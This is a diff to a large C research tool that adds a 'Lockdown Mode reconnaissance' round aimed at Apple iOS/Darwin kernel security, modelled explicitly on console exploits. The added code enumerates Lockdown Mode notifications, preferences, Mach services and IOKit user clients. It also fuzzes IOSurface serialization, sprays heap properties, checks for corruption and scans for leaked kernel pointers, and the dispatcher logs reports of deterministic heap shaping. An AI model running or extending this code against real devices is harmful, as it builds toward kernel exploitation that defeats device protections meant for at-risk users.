@@ -8638,6 +8638,416 @@ r326_done:
     fflush(stdout);
 }
 
+/* r327: Lockdown Mode reconnaissance — inspired by console exploit transitions
+   PSP swap-sploit: TOCTOU during security state change
+   Xbox 360 RGH: rapid state transitions to skip checks
+   PS4 BD-J: trusted complex subsystem as entry point */
+
+static void r327_probe(void) {
+    rlog("\n=== r327: Lockdown Mode Recon + Console Exploit Patterns ===\n");
+    rlog("  Strategy: Map LDM observable state, Darwin notifs, bootstrap services\n");
+    rlog("  Inspiration: PSP swap-sploit, Xbox RGH, Wii Twilight Hack\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: Darwin notification tokens for LDM ---- */
+    rlog("--- Part 1: Darwin notification monitoring ---\n");
+    fflush(stdout);
+    {
+        /* Register for LDM-related notification names and check current state */
+        const char *notif_names[] = {
+            "com.apple.security.lockdownmode",
+            "com.apple.security.lockdownmode.status",
+            "com.apple.security.lockdownmode.changed",
+            "com.apple.security.lockdown-mode",
+            "com.apple.lockdownmode",
+            "com.apple.lockdownmode.status",
+            "com.apple.lockdownmode.enabled",
+            "com.apple.managedconfiguration.lockdownmode",
+            "com.apple.ManagedConfiguration.LockdownMode",
+            "com.apple.Security.lockdownmode",
+            "com.apple.springboard.lockdownmode",
+            "com.apple.preferences.lockdownmode",
+            /* USB-related that LDM might affect */
+            "com.apple.usb.config-changed",
+            "com.apple.usbd.state-changed",
+            "com.apple.IOKit.usb",
+            /* JIT-related that LDM disables */
+            "com.apple.WebKit.jit-enabled",
+            "com.apple.jit.policy",
+            /* Profile/MDM related */
+            "com.apple.managedconfiguration.profileListChanged",
+            "com.apple.ManagedConfiguration.profileListChanged",
+            /* General security notifications */
+            "com.apple.security.configurationchanged",
+            "com.apple.security.sandboxviolation",
+            "com.apple.security.amfi.policy",
+            NULL
+        };
+
+        for (int i = 0; notif_names[i]; i++) {
+            int token = -1;
+            uint32_t status = notify_register_check(notif_names[i], &token);
+            if (status == 0) {
+                uint64_t state = 0;
+                notify_get_state(token, &state);
+                int check = 0;
+                notify_check(token, &check);
+                rlog("  '%s': token=%d state=0x%llx check=%d\n",
+                     notif_names[i], token, state, check);
+                notify_cancel(token);
+            } else {
+                rlog("  '%s': register failed (%u)\n", notif_names[i], status);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: NSUserDefaults / CFPreferences for LDM state ---- */
+    rlog("\n--- Part 2: Preferences/defaults for LDM state ---\n");
+    fflush(stdout);
+    {
+        /* Try to read LDM state from various preference domains */
+        const char *domains[] = {
+            "com.apple.security",
+            "com.apple.Security",
+            "com.apple.lockdownmode",
+            "com.apple.managedconfiguration",
+            "com.apple.ManagedConfiguration",
+            "com.apple.springboard",
+            "com.apple.preferences.security",
+            ".GlobalDomain",
+            NULL
+        };
+
+        const char *keys[] = {
+            "LockdownModeEnabled",
+            "lockdownModeEnabled",
+            "LDMEnabled",
+            "isLockdownModeEnabled",
+            "LockdownMode",
+            "lockdown_mode",
+            NULL
+        };
+
+        for (int d = 0; domains[d]; d++) {
+            CFStringRef domain = CFStringCreateWithCString(NULL, domains[d], kCFStringEncodingUTF8);
+            for (int k = 0; keys[k]; k++) {
+                CFStringRef key = CFStringCreateWithCString(NULL, keys[k], kCFStringEncodingUTF8);
+                CFPropertyListRef val = CFPreferencesCopyValue(key, domain,
+                    kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
+                if (val) {
+                    CFTypeID tid = CFGetTypeID(val);
+                    if (tid == CFBooleanGetTypeID()) {
+                        rlog("  %s/%s = %s (bool)\n", domains[d], keys[k],
+                             CFBooleanGetValue(val) ? "YES" : "NO");
+                    } else if (tid == CFNumberGetTypeID()) {
+                        int v = 0;
+                        CFNumberGetValue(val, kCFNumberIntType, &v);
+                        rlog("  %s/%s = %d (number)\n", domains[d], keys[k], v);
+                    } else if (tid == CFStringGetTypeID()) {
+                        char buf[128] = {0};
+                        CFStringGetCString(val, buf, sizeof(buf), kCFStringEncodingUTF8);
+                        rlog("  %s/%s = '%s' (string)\n", domains[d], keys[k], buf);
+                    } else {
+                        rlog("  %s/%s = <type %lu>\n", domains[d], keys[k], (unsigned long)tid);
+                    }
+                    CFRelease(val);
+                }
+                CFRelease(key);
+            }
+            CFRelease(domain);
+        }
+
+        /* Also try reading all keys from com.apple.security */
+        CFStringRef secDomain = CFSTR("com.apple.security");
+        CFArrayRef allKeys = CFPreferencesCopyKeyList(secDomain,
+            kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
+        if (allKeys) {
+            CFIndex cnt = CFArrayGetCount(allKeys);
+            rlog("  com.apple.security has %ld keys:\n", cnt);
+            for (CFIndex i = 0; i < cnt && i < 20; i++) {
+                CFStringRef k = CFArrayGetValueAtIndex(allKeys, i);
+                char buf[128] = {0};
+                CFStringGetCString(k, buf, sizeof(buf), kCFStringEncodingUTF8);
+                rlog("    '%s'\n", buf);
+            }
+            CFRelease(allKeys);
+        } else {
+            rlog("  com.apple.security: no keys readable\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: Bootstrap service lookup for LDM-related daemons ---- */
+    rlog("\n--- Part 3: Bootstrap service lookup ---\n");
+    fflush(stdout);
+    {
+        const char *services[] = {
+            "com.apple.securityd",
+            "com.apple.security.lockdownmode",
+            "com.apple.managedconfigurationd",
+            "com.apple.ManagedConfiguration",
+            "com.apple.mobile.lockdownd",
+            "com.apple.lockdownd",
+            "com.apple.lockdown",
+            "com.apple.usbd",
+            "com.apple.usbmuxd",
+            "com.apple.SpringBoard",
+            "com.apple.trustd",
+            "com.apple.amfid",
+            "com.apple.sandboxd",
+            "com.apple.containermanagerd",
+            "com.apple.mobile.installd",
+            "com.apple.fairplayd",
+            "com.apple.keybagd",
+            "com.apple.kernel.sptm",
+            "com.apple.sptm",
+            "com.apple.security.sptm",
+            NULL
+        };
+
+        mach_port_t bp;
+        task_get_bootstrap_port(mach_task_self(), &bp);
+
+        for (int i = 0; services[i]; i++) {
+            mach_port_t sp = MACH_PORT_NULL;
+            kern_return_t kr = bootstrap_look_up(bp, services[i], &sp);
+            if (kr == 0) {
+                rlog("  FOUND: %s port=0x%x\n", services[i], sp);
+                mach_port_deallocate(mach_task_self(), sp);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: IOKit service enumeration for LDM-specific services ---- */
+    rlog("\n--- Part 4: IOKit LDM-related service check ---\n");
+    fflush(stdout);
+    {
+        const char *match_names[] = {
+            "AppleUSBDevice", "AppleUSBHostDevice", "IOUSBHostDevice",
+            "AppleSEPManager", "AppleSEP", "AppleSPTM",
+            "AppleCredentialManager", "AppleFairPlay",
+            "AppleSSE", "AppleANE", "AppleNeuralEngine",
+            "AppleMesaSEPDriver", "AppleSEPKeyStore",
+            "AppleT8160PMGR", "AppleARMPMU",
+            NULL
+        };
+
+        for (int i = 0; match_names[i]; i++) {
+            io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                IOServiceMatching(match_names[i]));
+            if (svc) {
+                rlog("  FOUND: %s svc=0x%x", match_names[i], svc);
+
+                /* Try to open it */
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                if (kr == 0) {
+                    rlog(" OPENS conn=0x%x", conn);
+                    IOServiceClose(conn);
+                } else {
+                    rlog(" open=0x%x", kr);
+                }
+                rlog("\n");
+
+                /* Get properties */
+                CFMutableDictionaryRef props = NULL;
+                kr = IORegistryEntryCreateCFProperties(svc, &props,
+                    kCFAllocatorDefault, 0);
+                if (kr == 0 && props) {
+                    CFIndex cnt = CFDictionaryGetCount(props);
+                    rlog("    %ld properties\n", cnt);
+                    /* Check for any LDM-related properties */
+                    const void *propKeys[64];
+                    const void *propVals[64];
+                    if (cnt > 0 && cnt <= 64) {
+                        CFDictionaryGetKeysAndValues(props, propKeys, propVals);
+                        for (CFIndex j = 0; j < cnt; j++) {
+                            char kbuf[128] = {0};
+                            CFStringGetCString(propKeys[j], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                            /* Log if it looks security/lockdown related */
+                            if (strstr(kbuf, "lock") || strstr(kbuf, "Lock") ||
+                                strstr(kbuf, "security") || strstr(kbuf, "Security") ||
+                                strstr(kbuf, "mode") || strstr(kbuf, "Mode") ||
+                                strstr(kbuf, "SPTM") || strstr(kbuf, "sptm") ||
+                                strstr(kbuf, "SEP") || strstr(kbuf, "pauth")) {
+                                rlog("    KEY: '%s'\n", kbuf);
+                            }
+                        }
+                    }
+                    CFRelease(props);
+                }
+                IOObjectRelease(svc);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: Wii Twilight Hack pattern — IOSurface serialization probe ---- */
+    rlog("\n--- Part 5: IOSurface serialization stress (Twilight Hack pattern) ---\n");
+    fflush(stdout);
+    {
+        /* The Wii Twilight Hack exploited save game buffer overflow.
+           IOSurface properties go through IOKit serialization in kernel.
+           Try setting properties with unusual/large/nested values to test
+           for buffer handling issues in the kernel serialization path. */
+
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        typedef void (*IOSurfaceSetValue_fn)(void*, CFStringRef, CFTypeRef);
+        typedef CFTypeRef (*IOSurfaceCopyValue_fn)(void*, CFStringRef);
+        IOSurfaceSetValue_fn svFn = (IOSurfaceSetValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        IOSurfaceCopyValue_fn gvFn = (IOSurfaceCopyValue_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+        if (cFn && svFn && gvFn) {
+            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+            const void *vs2[] = {wV, hV, bV, pV};
+            CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs2, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            void *surface = cFn(props);
+
+            if (surface) {
+                rlog("  Surface id=%u\n", idFn(surface));
+
+                /* Test 1: Very long key name */
+                char longkey[1024];
+                memset(longkey, 'A', 1023);
+                longkey[1023] = 0;
+                CFStringRef lk = CFStringCreateWithCString(NULL, longkey, kCFStringEncodingUTF8);
+                int testval = 42;
+                CFNumberRef tv = CFNumberCreate(NULL, kCFNumberIntType, &testval);
+                svFn(surface, lk, tv);
+                CFTypeRef got = gvFn(surface, lk);
+                rlog("  Long key (1023): set=%d got=%p\n", testval, got);
+                if (got) CFRelease(got);
+                CFRelease(lk);
+                CFRelease(tv);
+
+                /* Test 2: Large data value (64KB) */
+                uint8_t *bigdata = calloc(1, 65536);
+                if (bigdata) {
+                    for (int i = 0; i < 65536; i++) bigdata[i] = (uint8_t)(i & 0xFF);
+                    CFDataRef bd = CFDataCreate(NULL, bigdata, 65536);
+                    svFn(surface, CFSTR("BigData"), bd);
+                    CFTypeRef gd = gvFn(surface, CFSTR("BigData"));
+                    if (gd && CFGetTypeID(gd) == CFDataGetTypeID()) {
+                        long len = CFDataGetLength((CFDataRef)gd);
+                        rlog("  Big data (64KB): got %ld bytes\n", len);
+                        /* Scan for kptrs in the returned data */
+                        const uint8_t *bp = CFDataGetBytePtr((CFDataRef)gd);
+                        int kptrs = 0;
+                        for (long j = 0; j + 8 <= len; j += 8) {
+                            uint64_t v;
+                            memcpy(&v, bp + j, 8);
+                            if ((v >> 28) == 0xfffffffULL && v != 0xffffffffffffffffULL) {
+                                rlog("    !!! KPTR at +%ld: 0x%llx !!!\n", j, v);
+                                kptrs++;
+                            }
+                        }
+                        rlog("  Big data kptr scan: %d\n", kptrs);
+                        CFRelease(gd);
+                    }
+                    CFRelease(bd);
+                    free(bigdata);
+                }
+
+                /* Test 3: Deeply nested dictionary (like crafted save games) */
+                CFMutableDictionaryRef nested = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFMutableDictionaryRef current = nested;
+                for (int depth = 0; depth < 50; depth++) {
+                    char dkey[16];
+                    snprintf(dkey, sizeof(dkey), "d%d", depth);
+                    CFStringRef dk = CFStringCreateWithCString(NULL, dkey, kCFStringEncodingUTF8);
+                    CFMutableDictionaryRef child = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(current, dk, child);
+                    CFRelease(dk);
+                    CFRelease(child);
+                    current = child;
+                }
+                /* Set the deeply nested dict as a surface property */
+                svFn(surface, CFSTR("DeepNest"), nested);
+                CFTypeRef gn = gvFn(surface, CFSTR("DeepNest"));
+                rlog("  Deep nested dict (50 levels): got=%p\n", gn);
+                if (gn) {
+                    /* Walk and check for corruption */
+                    CFDictionaryRef walk = (CFDictionaryRef)gn;
+                    int depth = 0;
+                    while (walk && CFGetTypeID(walk) == CFDictionaryGetTypeID()) {
+                        char dkey[16];
+                        snprintf(dkey, sizeof(dkey), "d%d", depth);
+                        CFStringRef dk = CFStringCreateWithCString(NULL, dkey, kCFStringEncodingUTF8);
+                        CFTypeRef next = CFDictionaryGetValue(walk, dk);
+                        CFRelease(dk);
+                        if (!next) break;
+                        walk = next;
+                        depth++;
+                    }
+                    rlog("  Deep nest walk: reached depth %d\n", depth);
+                    CFRelease(gn);
+                }
+                CFRelease(nested);
+
+                /* Test 4: Many properties rapid-fire (heap pressure) */
+                rlog("  Rapid property spray (200 keys)...\n");
+                for (int i = 0; i < 200; i++) {
+                    char rk[32];
+                    snprintf(rk, sizeof(rk), "spray_%d", i);
+                    CFStringRef rks = CFStringCreateWithCString(NULL, rk, kCFStringEncodingUTF8);
+                    uint8_t sdata[256];
+                    memset(sdata, (uint8_t)i, sizeof(sdata));
+                    CFDataRef sd = CFDataCreate(NULL, sdata, sizeof(sdata));
+                    svFn(surface, rks, sd);
+                    CFRelease(rks);
+                    CFRelease(sd);
+                }
+                /* Read back a sample */
+                CFTypeRef sample = gvFn(surface, CFSTR("spray_100"));
+                if (sample && CFGetTypeID(sample) == CFDataGetTypeID()) {
+                    const uint8_t *sb = CFDataGetBytePtr((CFDataRef)sample);
+                    rlog("  spray_100: len=%ld first_byte=0x%02x (expect 0x64)\n",
+                         CFDataGetLength((CFDataRef)sample), sb[0]);
+                    /* Check for corruption in nearby spray values */
+                    int corrupted = 0;
+                    for (int i = 95; i <= 105; i++) {
+                        char rk[32];
+                        snprintf(rk, sizeof(rk), "spray_%d", i);
+                        CFStringRef rks = CFStringCreateWithCString(NULL, rk, kCFStringEncodingUTF8);
+                        CFTypeRef v = gvFn(surface, rks);
+                        if (v && CFGetTypeID(v) == CFDataGetTypeID()) {
+                            const uint8_t *vb = CFDataGetBytePtr((CFDataRef)v);
+                            if (vb[0] != (uint8_t)i) {
+                                rlog("  !!! CORRUPTION: spray_%d first=0x%02x expect=0x%02x\n",
+                                     i, vb[0], (uint8_t)i);
+                                corrupted++;
+                            }
+                            CFRelease(v);
+                        }
+                        CFRelease(rks);
+                    }
+                    rlog("  Spray corruption check: %d/11 corrupted\n", corrupted);
+                    CFRelease(sample);
+                }
+
+                CFRelease(surface);
+            }
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r327 complete ===\n");
+    fflush(stdout);
+}
+
 static void r317_probe(void) {
     rlog("\n=== r317: Deep AppleKeyStore + AppleJPEGDriver + CredentialManager ===\n\n");
     fflush(stdout);
@@ -39450,6 +39860,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 327) {
+            rlog("*** rounds=327: Lockdown Mode Recon + Console Exploit Patterns ***\n");
+            rlog("  r326: Heap shaping DETERMINISTIC, 30/31 contiguous, all freed reused.\n");
+            rlog("  Probe: LDM Darwin notifs, prefs, bootstrap, IOKit, serialization.\n\n");
+            r327_probe();
             goto done;
         }
         if (rounds == 326) {
